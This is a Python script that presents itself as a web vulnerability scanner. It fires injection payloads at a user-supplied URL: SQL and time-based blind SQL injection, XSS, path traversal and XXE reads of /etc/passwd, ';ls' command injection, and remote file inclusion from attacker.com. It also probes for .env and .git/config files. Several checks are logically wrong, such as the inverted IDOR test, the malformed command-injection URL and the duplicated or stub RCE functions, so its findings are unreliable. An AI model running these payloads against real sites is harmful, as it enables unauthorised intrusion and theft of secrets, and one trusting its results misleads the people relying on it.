import requests
from bs4 import BeautifulSoup
import argparse

# Function to ensure URL has a scheme
def ensure_scheme(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

# Function to check for SQL Injection vulnerability
def check_sql_injection(url):
    url = ensure_scheme(url)
    payload = "' OR '1'='1"
    injected_url = f"{url}?id={payload}"

    response = requests.get(injected_url)

    if "Error" in response.text:
        print("SQL Injection vulnerability found!")
    else:
        print("No SQL Injection vulnerability detected.")

# Function to check for XSS vulnerability
def check_xss(url):
    url = ensure_scheme(url)
    payload = "<script>alert('XSS Vulnerability')</script>"
    injected_url = f"{url}?input={payload}"

    response = requests.get(injected_url)

    if payload in response.text:
        print("XSS vulnerability found!")
    else:
        print("No XSS vulnerability detected.")

# Function to check for Directory Traversal vulnerability
def check_directory_traversal(url):
    url = ensure_scheme(url)
    payload = "../../../../../../../../../etc/passwd"
    injected_url = f"{url}?file={payload}"

    response = requests.get(injected_url)

    if "root:" in response.text:
        print("Directory Traversal vulnerability found!")
    else:
        print("No Directory Traversal vulnerability detected.")

# Function to check for Command Injection vulnerability
def check_command_injection(url):
    url = ensure_scheme(url)
    payload = ";ls"
    injected_url = f"{url};{payload}"

    response = requests.get(injected_url)

    if "file1" in response.text:
        print("Command Injection vulnerability found!")
    else:
        print("No Command Injection vulnerability detected.")

# Function to check for CSRF vulnerability
def check_csrf(url):
    url = ensure_scheme(url)
    payload = "attacker-controlled-data"

    # This is a basic example and would need to be tailored to the target application's forms
    # A real CSRF check would involve:
    # 1. Identifying a state-changing form (e.g., changing password, adding a user, deleting data)
    # 2. Crafting a request to submit that form data without a valid CSRF token
    # 3. Checking the response or the application state to see if the action was successful

    # Example placeholder: Attempting to send a POST request to a hypothetical endpoint
    # This assumes a form submission to a /update_profile endpoint with a 'data' field
    try:
        response = requests.post(f"{url}/update_profile", data={'data': payload})
        if response.status_code == 200 and "success" in response.text.lower(): # This success check is a placeholder
            print("Potential CSRF vulnerability found! A state-changing action might be possible without a valid token.")
        else:
            print("No obvious CSRF vulnerability detected (based on this basic test).")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during CSRF check: {e}")
# Function to check for Remote Code Execution vulnerability
def check_remote_code_execution(url):
    url = ensure_scheme(url)
    payload = "; ls" # Using a simple command injection payload
    injected_url = f"{url};{payload}" # Assuming a vulnerable parameter or endpoint

    response = requests.get(injected_url)

    # Look for indicators of command execution in the response (e.g., file listings)
    if "file1" in response.text or "total" in response.text.lower(): # Example indicators
        print("Potential Remote Code Execution vulnerability found!")
    else:
        print("No obvious Remote Code Execution vulnerability detected.")

# Function to check for Sensitive Data Exposure vulnerability
def check_sensitive_data_exposure(url):
    url = ensure_scheme(url)
    common_paths = [
        "/backup", "/backup.zip", "/backup.tar.gz",
        "/config.json", "/config.xml", "/config.ini",
        "/.env", "/.git/config",
        "/wp-config.php~", # Common WordPress backup file
    ]
    for path in common_paths:
        full_url = f"{url}{path}"
        response = requests.get(full_url)
        if response.status_code == 200 and len(response.text) > 0: # Check for a successful response with content
            print(f"Potential Sensitive Data Exposure found at: {full_url} (Status Code: {response.status_code})")

# Function to check for XML External Entity (XXE) vulnerability
def check_xxe(url):
    url = ensure_scheme(url)
    payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
    headers = {'Content-Type': 'application/xml'}

    response = requests.post(url, data=payload, headers=headers)

    if "root:" in response.text:
        print("XML External Entity (XXE) vulnerability found! The server processed the external entity and exposed /etc/passwd.")
    # Note: Detecting XXE reliably can be complex and may require out-of-band techniques or different payloads depending on the server's configuration. This is a basic in-band check.

# Function to check for Server-Side Request Forgery (SSRF) vulnerability
def check_ssrf(url):
    url = ensure_scheme(url)
    # Attempt to access an internal resource (e.g., localhost) via the target URL
    # This is a basic example and might need adjustment based on how the target application handles URLs
    payload = "http://localhost/"
    injected_url = f"{url}?url={payload}" # Assuming a vulnerable parameter named 'url'

    response = requests.get(injected_url)

    if response.status_code == 200 and ("apache" in response.text.lower() or "nginx" in response.text.lower() or "iis" in response.text.lower()): # Look for indicators of an internal server
        print("Potential Server-Side Request Forgery (SSRF) vulnerability found!")
    # Note: Advanced SSRF detection might involve out-of-band techniques or checking for specific internal IP addresses/ports.

# Function to check for Remote File Inclusion (RFI) vulnerability
def check_rfi(url):
    url = ensure_scheme(url)
    payload = "http://attacker.com/malicious.php"
    # Attempt to include a remote file using a common parameter name
    injected_url = f"{url}?file={payload}" # Assuming a vulnerable parameter name 'file'

    response = requests.get(injected_url)

    # Look for indicators that the remote file's content was included or executed
    # This is a basic check; a real malicious.php would contain specific output to search for
    if "<?php" in response.text or "attacker-controlled-output" in response.text: # Replace "attacker-controlled-output" with a known string from your malicious file
        print("Potential Remote File Inclusion (RFI) vulnerability found!")
    # Note: Detecting successful RFI without controlling the remote file and checking for specific output is difficult.

# Function to check for Local File Inclusion (LFI) vulnerability
def check_lfi(url):
    url = ensure_scheme(url)
    payload = "../../../../../../../../../etc/passwd"
    # Attempt to include a local file using a common parameter name
    injected_url = f"{url}?file={payload}" # Assuming a vulnerable parameter name 'file'

    response = requests.get(injected_url)

    # Look for indicators that the local file's content was included
    if "root:" in response.text:
        print("Local File Inclusion (LFI) vulnerability found! The content of /etc/passwd was included.")

# Function to check for Cross-Site Script Inclusion (XSSI) vulnerability
def check_xssi(url):
    url = ensure_scheme(url)
    # A basic XSSI check involves attempting to load a script from a different origin
    # and seeing if it executes or if sensitive data is exposed to it.
    # This is a difficult vulnerability to detect reliably without a controlled attacker server
    # and specific knowledge of the target application's data structures.

    # Example: Attempting to load a script that might try to access window properties
    # A real XSSI payload would be hosted on an attacker-controlled server and attempt to exfiltrate data
    payload = "http://attacker.com/malicious.js" # Replace with your attacker-controlled server URL
    injected_url = f"{url}/some_page?script={payload}" # Assuming a parameter that takes a script URL

    # This check is highly dependent on the target application's behavior
    print("Cross-Site Script Inclusion (XSSI) check requires manual analysis and a controlled environment.")
    print(f"Consider if {url} loads external scripts in a way that could expose sensitive data.")

# Function to check for Blind SQL Injection vulnerability
def check_sql_injection_blind(url):
    url = ensure_scheme(url)
    # Using a time-based blind SQL injection payload
    # This payload attempts to cause a delay if the condition is true
    payload_time_based = "' AND (SELECT 5 FROM pg_sleep(5)) --" # Example for PostgreSQL
    # Other databases have different sleep functions (e.g., SLEEP(5) for MySQL, WAITFOR DELAY '00:00:05' for MSSQL)
    # You might need to adapt the payload based on the target database type.

    start_time = requests.get(url).elapsed.total_seconds()
    response_time = requests.get(f"{url}?id={payload_time_based}").elapsed.total_seconds() # Assuming 'id' is a vulnerable parameter

    # If the response time is significantly longer than the normal response time, it indicates a potential time-based blind SQL injection vulnerability
    if response_time > start_time + 4: # Check if the delay is roughly the expected sleep time
        print("Potential Blind SQL Injection vulnerability found (time-based).")
    # Note: Blind SQL injection detection can be complex and often requires iterating through characters or using boolean-based techniques. This is a simplified time-based example.

# Function to check for CORS Misconfiguration vulnerability
def check_cors_misconfiguration(url):
    url = ensure_scheme(url)
    attacker_origin = "http://attacker.com"
    headers = {'Origin': attacker_origin}

    response = requests.get(url, headers=headers)

    access_control_allow_origin = response.headers.get('Access-Control-Allow-Origin')
    if access_control_allow_origin == '*' or access_control_allow_origin == attacker_origin:
        print(f"Potential CORS Misconfiguration found! 'Access-Control-Allow-Origin' header is set to '{access_control_allow_origin}'.")

# Function to check for Insecure Direct Object References (IDOR) vulnerability
def check_idor(url):
    url = ensure_scheme(url)
    user_id = 1
    injected_url = f"{url}?user_id={user_id}"

    response = requests.get(injected_url)

    if "Unauthorized" in response.text:
        print("IDOR vulnerability found!")
    else:
        print("No IDOR vulnerability detected.")

# Function to check for Insecure Authentication vulnerability
def check_insecure_authentication(url):
    url = ensure_scheme(url)
    payload = "attacker"
    # This is a very basic placeholder for insecure authentication.
    # A real check would be highly dependent on the target application's login mechanism.
    # It could involve:
    # 1. Attempting common default credentials.
    # 2. Trying weak or guessable passwords.
    # 3. Checking for session fixation or session hijacking vulnerabilities (more complex).
    # 4. Analyzing the authentication process for logical flaws.

    # Example: Attempting a simple GET request to a protected page without authentication
    protected_url = f"{url}/admin" # Replace with a known protected URL on the target

    response = requests.get(protected_url)

    if response.status_code == 200 and "Welcome Admin" in response.text: # Look for indicators of successful unauthorized access
        print(f"Potential Insecure Authentication vulnerability found! Access to {protected_url} granted without proper authentication.")
    # Note: This is a highly simplified check. Real-world authentication testing requires deeper analysis of the target application.

# Function to check for Server-Side Template Injection (SSTI) vulnerability
def check_ssti(url):
    url = ensure_scheme(url)
    payload = "{{7*7}}"  # A common payload for testing SSTI
    # You would need to identify a user input field or parameter that is processed by a template engine
    # For this example, we'll assume a vulnerable parameter named 'template_input'
    injected_url = f"{url}?template_input={payload}" 
    response = requests.get(injected_url)

    if "49" in response.text:  # Check if the template engine evaluated the expression
        print("Potential Server-Side Template Injection (SSTI) vulnerability found!")

# Function to check for Remote Code Execution (RCE) vulnerability
def check_rce(url):
    url = ensure_scheme(url)
    payload = "system('ls')"
    # Placeholder for RCE check logic
    print("Remote Code Execution check logic not implemented.")

# Function to scan for all vulnerabilities
def scan_all_vulnerabilities(url):
    print("Scanning for SQL Injection vulnerability...")
    check_sql_injection(url)
    print("Scanning for XSS vulnerability...")
    check_xss(url)
    print("Scanning for Directory Traversal vulnerability...")
    check_directory_traversal(url)
    print("Scanning for Command Injection vulnerability...")
    check_command_injection(url)
    print("Scanning for CSRF vulnerability...")
    check_csrf(url)
    print("Scanning for Remote Code Execution vulnerability...")
    check_remote_code_execution(url)
    print("Scanning for Sensitive Data Exposure vulnerability...")
    check_sensitive_data_exposure(url)
    print("Scanning for XML External Entity (XXE) vulnerability...")
    check_xxe(url)
    print("Scanning for Server-Side Request Forgery (SSRF) vulnerability...")
    check_ssrf(url)
    print("Scanning for Remote File Inclusion (RFI) vulnerability...")
    check_rfi(url)
    print("Scanning for Local File Inclusion (LFI) vulnerability...")
    check_lfi(url)
    print("Scanning for Cross-Site Script Inclusion (XSSI) vulnerability...")
    check_xssi(url)
    print("Scanning for Blind SQL Injection vulnerability...")
    check_sql_injection_blind(url)
    print("Scanning for CORS Misconfiguration vulnerability...")
    check_cors_misconfiguration(url)
    print("Scanning for Insecure Direct Object References (IDOR) vulnerability...")
    check_idor(url)
    print("Scanning for Insecure Authentication vulnerability...")
    check_insecure_authentication(url)
    print("Scanning for Server-Side Template Injection (SSTI) vulnerability...")
    check_ssti(url)
    print("Scanning for Remote Code Execution (RCE) vulnerability...")
    check_rce(url)

def main():
    parser = argparse.ArgumentParser(description="Sarbaz Gomnam: Web Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-a", "--auto", help="Automatically scan all vulnerabilities", action="store_true")
    parser.add_argument("--sqli", "-s", help="Scan for SQL Injection vulnerability", action="store_true")
    parser.add_argument("--xss", "-x", help="Scan for XSS vulnerability", action="store_true")
    parser.add_argument("--dirtrav", "-d", help="Scan for Directory Traversal vulnerability", action="store_true")
    parser.add_argument("--cmdi", "-c", help="Scan for Command Injection vulnerability", action="store_true")
    parser.add_argument("--csrf", help="Scan for CSRF vulnerability", action="store_true")
    parser.add_argument("--rce", help="Scan for Remote Code Execution vulnerability", action="store_true")
    parser.add_argument("--sensitive", help="Scan for Sensitive Data Exposure vulnerability", action="store_true")
    parser.add_argument("--xxe", help="Scan for XML External Entity vulnerability", action="store_true")
    parser.add_argument("--ssrf", help="Scan for Server-Side Request Forgery vulnerability", action="store_true")
    parser.add_argument("--rfi", help="Scan for Remote File Inclusion vulnerability", action="store_true")
    parser.add_argument("--lfi", help="Scan for Local File Inclusion vulnerability", action="store_true")
    parser.add_argument("--xssi", help="Scan for Cross-Site Script Inclusion vulnerability", action="store_true")
    parser.add_argument("--bsqli", help="Scan for Blind SQL Injection vulnerability", action="store_true")
    parser.add_argument("--cors", help="Scan for CORS Misconfiguration vulnerability", action="store_true")
    parser.add_argument("--idor", help="Scan for Insecure Direct Object References vulnerability", action="store_true")
    parser.add_argument("--auth", help="Scan for Insecure Authentication vulnerability", action="store_true")
    parser.add_argument("--ssti", help="Scan for Server-Side Template Injection vulnerability", action="store_true")

    args = parser.parse_args()

    if args.auto:
        scan_all_vulnerabilities(args.url)
    else:
        if args.sqli:
            check_sql_injection(args.url)
        if args.xss:
            check_xss(args.url)
        if args.dirtrav:
            check_directory_traversal(args.url)
        if args.cmdi:
            check_command_injection(args.url)
        if args.csrf:
            check_csrf(args.url)
        if args.rce:
            check_remote_code_execution(args.url)
        if args.sensitive:
            check_sensitive_data_exposure(args.url)
        if args.xxe:
            check_xxe(args.url)
        if args.ssrf:
            check_ssrf(args.url)
        if args.rfi:
            check_rfi(args.url)
        if args.lfi:
            check_lfi(args.url)
        if args.xssi:
            check_xssi(args.url)
        if args.bsqli:
            check_sql_injection_blind(args.url)
        if args.cors:
            check_cors_misconfiguration(args.url)
        if args.idor:
            check_idor(args.url)
        if args.auth:
            check_insecure_authentication(args.url)
        if args.ssti:
            check_ssti(args.url)

if __name__ == "__main__":
    main()
